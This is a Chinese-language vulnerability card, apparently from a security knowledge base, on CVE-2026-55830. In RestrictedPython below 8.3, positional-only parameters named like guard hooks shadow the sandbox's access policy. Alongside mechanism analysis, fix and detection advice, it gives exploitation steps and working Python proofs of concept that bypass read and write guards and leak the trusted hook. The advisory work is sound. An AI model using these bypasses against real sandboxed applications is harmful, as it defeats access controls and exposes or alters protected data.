---
id: binary-pwn-sandbox-escape-restrictedpython-posonly-guard-shadow
title: RestrictedPython posonlyargs 漏检导致 guard 遮蔽沙箱策略绕过（CVE-2026-55830）
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: restrictedpython-posonly-guard-shadow
tags:
- python
- restrictedpython
- sandbox-escape
- ast
- code-transform
- guard-shadowing
- posonlyargs
- cwe-184
cve:
- CVE-2026-55830
affected_versions: RestrictedPython < 8.3（8.3 修复）
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V24
  verified_at: '2026-11-05T03:00:22+08:00'
  notes: 已对照原文全文与19张图核对：check_function_argument_names 漏 posonlyargs、ast.arg 绕过 visit_Name、generic_visit 只防新节点类型不防新字段、裸 ast.Name 注入 guard 与 LEGB 遮蔽、co_varnames/LOAD_FAST 字节码证据、9 guard×5 参数×def/lambda 的 18/90 与 0/90 矩阵、P1-P4 的 16/16 判定均与原文一致；原文明确 < 8.3 受影响、8.3 修复，已 set-versions。卡片保留原文边界（真实产品敏感数据读取/pickle RCE/后5个 guard 后果未验证），未外推。PoC 未在本机执行。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-restrictedpython-posonly-guard-shadow/
draft: false
kb_aliases:
- RestrictedPython 沙箱逃逸
- CVE-2026-55830
- posonlyargs 漏检
- guard 遮蔽
- _getattr_ 遮蔽
- _write_ 遮蔽
- 安全 API 名字遮蔽
- CWE-184
---

## 一句话结论

RestrictedPython 的 `check_function_argument_names()` 手工枚举参数类别时漏掉了 Python 3.8/PEP 570 新增的 `posonlyargs` 字段；攻击者用 positional-only 参数定义一个与内部 guard 同名的局部变量（如 `_getattr_`），就能遮蔽 transformer 以裸 `ast.Name` 注入的受信 hook，使 `o.x`/`o[k]`/属性写入/`print` 等敏感操作绕过嵌入应用的访问策略；RestrictedPython 8.3 在编译期拒绝 `_` 前缀的 posonly 参数。

## 原理

- RestrictedPython 在把不可信源码交给内置 `compile()` 之前，先用 `ast.NodeTransformer`（`RestrictingNodeTransformer`）做安全检查和 AST 改写。敏感语法会被改写为对 guard hook 的调用：
  - `o.x` → `_getattr_(o, 'x')`
  - `o[k]` → `_getitem_(o, k)`
  - `o.x = v` → `_write_(o).x = v`
  - `print(s)` → `_print._call_print(s)`，并在函数开头插入 `_print = _print_(_getattr_)`
  - `for x in it` → `for x in _getiter_(it)`，以及 `_apply_`、`_unpack_sequence_`、`_inplacevar_` 等
- 嵌入应用把这些 guard 放进沙箱全局命名空间，由它们实施访问策略。整套模型依赖两条不变量：
  - S1：用户代码不能建立 `_` 前缀的名字绑定；
  - S2：因此 transformer 注入的裸 `_getattr_` 等名字运行时只会解析到嵌入方的受信全局。
- `check_name()` 负责 S1，拒绝 `_` 前缀、`__roles__` 结尾和保留名。它在赋值目标、函数名、类名、import 别名、`except as`、普通参数、`*args`、`**kwargs`、keyword-only 参数等绑定点被调用。
- 漏洞在 `check_function_argument_names()`：它逐项检查 `node.args.args`、`vararg`、`kwarg`、`kwonlyargs`，却没有检查 `node.args.posonlyargs`。PEP 570 在 Python 3.8 给 `ast.arguments` 新增了这个字段，枚举式校验没有同步。
- 为什么 `visit_Name` 兜不住：函数形参在 AST 中是 `ast.arg`，只有 `arg` 字符串属性，不是 `ast.Name`；`visit_Name`/`check_name` 看不到它，唯一检查入口就是漏了字段的 `check_function_argument_names()`。
- 为什么 fail-closed 也挡不住：transformer 覆写 `generic_visit`，拒绝不认识的 AST 节点类型；但 `posonlyargs` 不是新节点类型，而是已知节点 `ast.arguments` 上的新字段，`ast.arg` 也早已存在，全程没有陌生节点触发拒绝。
- 注入侧的危险性：`visit_Attribute`、`visit_Subscript`、`inject_print_collector` 等以裸 `ast.Name('_getattr_', ast.Load())` 生成调用，且注入节点不会被再次 `visit()`/`check_name()`。于是改写后的函数同时拥有“局部形参 `_getattr_`”和“裸名字调用 `_getattr_`”。
- Python 的 LEGB 名字解析决定结果：局部参数优先于全局 hook。CPython 3.12 字节码中，正常代码是 `LOAD_GLOBAL _getattr_`（`co_names` 含 `_getattr_`），被遮蔽后变成 `LOAD_FAST _getattr_`（`co_varnames` 含 `_getattr_`，`co_names` 为空）。遮蔽关系在编译期就固化进 code object，不是运行时偶然。
- 影响不止 `_getattr_`：凡是以裸名字注入的 guard 都可被同名 posonly 参数遮蔽，共 9 个：`_getattr_`、`_getitem_`、`_write_`、`_print_`、`_getiter_`、`_apply_`、`_unpack_sequence_`、`_inplacevar_`、`_iter_unpack_sequence_`。
- `print` 机制还可用于泄露受信对象：`inject_print_collector` 插入的 `_print = _print_(_getattr_)` 在函数体执行前求值，右边的 `_print_` 解析到攻击者遮蔽的局部 lambda，而 `_getattr_` 解析到真实全局 hook；攻击者 lambda 因此能把真实的 `_getattr_` 对象作为参数捕获。

## 触发条件

- 目标使用 RestrictedPython < 8.3 执行不可信 Python 代码，运行在 Python 3.8+（`posonlyargs` 存在）。
- 嵌入应用依赖 `_getattr_`、`_getitem_`、`_write_` 等 guard hook 实施访问策略，而不是只依赖语法黑名单。
- 攻击者能向沙箱提交并执行代码（这正是 RestrictedPython 的设计场景，对应 CVSS 的 `PR:H`）。
- 沙箱允许函数/lambda 定义，且未在库外额外做 posonly 参数预检。

## 利用步骤

1. 确认目标运行的 RestrictedPython 版本 < 8.3，且 guard 策略由嵌入应用注入沙箱全局。
2. 选择一个要绕过的 guard：读属性用 `_getattr_`，读下标用 `_getitem_`，写属性用 `_write_`，`print` 用 `_print_`，其它语法对应 `_getiter_`/`_apply_` 等。
3. 在函数或 lambda 的 positional-only 参数区（`/` 之前）定义同名参数，默认值设为攻击者函数：
   ```python
   def f(o, _getattr_=lambda obj, name: "SHADOWED", /):
       return o.secret
   ```
4. 在函数体中使用会被 transformer 改写的敏感语法；改写产生的裸 `_getattr_(o, 'secret')` 会命中局部参数，而不是全局 guard。
5. 调用该函数，观察 guard 调用次数为 0、返回值为攻击者控制的内容；写路径可观察目标对象被实际修改。
6. 若要泄露 guard 对象，用 `_print_` 遮蔽配合 `print` 触发注入的 `_print = _print_(_getattr_)`，在 lambda 中捕获真实 `_getattr_`。
7. 验证修复：同一源码在 8.3 上应被编译期拒绝（`"_getattr_" is an invalid variable name because it starts with "_"`）。

## PoC

读属性策略绕过（P1）：

```python
def f(o, _getattr_=lambda obj, name: "SHADOWED-RETURN", /):
    return o.secret
result = f(target)
```

`target.secret = "TOP-SECRET-DATA"`，目标应用本应通过 `_getattr_` 拒绝读取 `secret`；8.2 实测 `result='SHADOWED-RETURN'`，`_getattr_` 策略 hook 调用次数为 0。8.3 编译期拒绝。

读下标策略绕过（P2）：

```python
def f(o, _getitem_=lambda obj, key: "SHADOWED-ITEM", /):
    return o["secret"]
result = f(target)
```

写保护绕过（P3，后果最明确）：

```python
def f(o, v, _write_=lambda o: o, /):
    o.secret = v
    return "write-done"
result = f(target, "PWNED-BY-ATTACKER")
```

8.2 实测 `target.secret` 被改写为 `PWNED-BY-ATTACKER`，`_write_` hook 调用次数为 0；对照组的正常写入会调用 1 次。

捕获受信 guard 对象（P4）：

```python
out = []
def f(_print_=lambda real_getattr: out.append(str(real_getattr)), /):
    try:
        print("trigger print machinery")
    except Exception:
        pass
    return out
result = f()
```

8.2 实测返回值包含 `<function build_policy.<locals>.policy_getattr at 0x...>`，即真实的 `_getattr_` hook 对象。

最小库级验证：

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_globals, safer_getattr

calls = []
def policy_getattr(obj, name, default=None):
    calls.append(name)
    return safer_getattr(obj, name, default)

src = 'def f(o, _getattr_=lambda obj, name: "shadowed", /):\n    return o.x\n'
code = compile_restricted(src, "<s>", "exec")
g = dict(safe_globals); g["_getattr_"] = policy_getattr
exec(code, g)
print(g["f"](type("O", (), {"x": "secret"})()), calls)
# 8.2: ('shadowed', [])  -> 策略 hook 零调用
# 8.3: compile_restricted 抛 SyntaxError
```

## 变体与关联

- 变体：9 个 guard 名均可同型遮蔽；8.2 的编译矩阵中每个名字在 `def` 与 `lambda` 的 posonly 类别都被接受（18/90），其余四类参数全部被拒绝；8.3 为 0/90。
- 变体：`compile_restricted_function(p=...)` 的参数串 `p` 可能可控，它会被拼进 `def masked_function_name(%s)` 再解析，同样可触发本漏洞。
- 变体：这是“语言演进新增绑定点但校验器未同步”的通用模式；模式匹配捕获、海象目标、推导式变量等新绑定点都值得按同样方法核对。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]、[[binary-pwn-sandbox-escape-python-dis-checker-break-bypass]]、[[binary-pwn-sandbox-escape-python-regex-ast-alias-concat]]（其它 Python 沙箱策略绕过）。
- 关联：[[code-analysis-sast-codeql-struts-ognl-taint-modeling]]（同样用 CodeQL 枚举注入点/危险 sink 的审计方法）。
- 边界：本漏洞不直接绕过 RestrictedPython 的语法限制，也不直接等于 RCE；实际危害取决于嵌入应用的 guard 实现、注入对象和授权规则。原文未验证 `pickle` 串联 RCE，也未构造后 5 个 guard 的应用后果链。

## 检测与防御

- 修复：升级 RestrictedPython `>= 8.3`；修复只有 3 行——把 `posonlyargs` 纳入 `check_function_argument_names()` 的统一 `check_name()` 校验。
- 临时预检：在调用 RestrictedPython 前对不可信源码做 AST 预检，拒绝所有 `_` 前缀（单独 `_` 除外）的 positional-only 参数；`compile_restricted_function(p=...)` 的参数串也要按同样规则检查。
- 审计：把“所有能建立用户命名的语法”列成矩阵（普通参数、posonly、kwonly、vararg、kwarg、赋值目标、import 别名、`except as`、函数/类名、推导式变量、海象目标、模式匹配捕获），逐格确认是否经过统一的 `check_name()`；枚举式校验器必须与语言 AST 字段同步。
- 设计：不要以裸名字在用户作用域注入受信对象；若必须注入，使用不可被用户绑定的名字或显式从受信命名空间取值，并在注入后做二次校验。
- 纵深防御：不要只依赖 guard hook 作为唯一安全边界；对沙箱控制对象避免 `pickle`，限制注入 `safe_globals`/`safe_builtins` 的额外名字，按最小权限运行。
- 检测：源码中出现 `/` 前的 `_` 前缀参数、`posonlyargs` 中含 guard 名；编译/执行日志中 guard 调用次数异常为 0；升级后用回归用例覆盖全部参数类别。
